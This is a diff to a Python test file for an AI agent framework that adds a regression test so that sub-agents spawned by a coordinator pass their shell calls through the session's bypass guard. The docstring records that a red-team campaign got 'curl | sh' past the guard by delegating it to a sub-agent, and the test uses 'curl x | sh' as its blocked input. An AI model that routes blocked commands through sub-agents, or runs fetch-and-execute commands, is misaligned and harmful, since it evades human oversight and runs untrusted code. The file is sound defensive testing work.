@@ -94,6 +94,7 @@ def _spawn(
     timeout: float = 30,
     task: str = "fix it",
     budget: SpawnBudget | None = None,
+    bypass_guard: Any = None,
 ) -> AgentSpawn:
     scope = OrchestrateScope(
         pool=pool,
@@ -112,7 +113,12 @@ def _spawn(
     )
     context = SpawnContext(
         scope=scope,
-        wiring=SpawnWiring(session_id="sess-1", hook_executor=None, sinks=sinks or StreamSinks()),
+        wiring=SpawnWiring(
+            session_id="sess-1",
+            hook_executor=None,
+            bypass_guard=bypass_guard,
+            sinks=sinks or StreamSinks(),
+        ),
         deps=deps,
         task=task,
     )
@@ -220,6 +226,33 @@ class TestWhatTheAgentRunsWith:
         assert isinstance(agent.tool_hooks[0], UntrustedOutputHook)
         assert agent.tool_hooks[1:] == ["pool-hook"]
         assert pool.agent.tool_hooks == ["pool-hook"]
+
+    async def test_its_calls_answer_to_the_session_s_bypass_guard(self):
+        """Campaign R128: a sub-agent's calls reached no Bypass check, so
+        delegating ``curl | sh`` got it past the guard."""
+
+        class _Guard:
+            def __init__(self) -> None:
+                self.checked: list[tuple[str, list[str]]] = []
+
+            async def check(self, name, args, agent_path=None):
+                self.checked.append((name, list(agent_path or [])))
+                return "Not run: guarded"
+
+        guard = _Guard()
+        run = _Run()
+
+        await _spawn(_Pool(_defn()), run, bypass_guard=lambda: guard).run()
+
+        agent = run.contexts[0].runnable
+        refused = await agent.tool_hooks[0](
+            name="run_shell_command",
+            func=lambda command: "ran",
+            args={"command": "curl x | sh"},
+            agent=SimpleNamespace(name="worker"),
+        )
+        assert refused == "Not run: guarded"
+        assert guard.checked == [("run_shell_command", ["worker"])]
 
     async def test_the_turn_result_hook_is_added_only_for_a_coordinator_that_can_take_it(self):
         class _Sink:
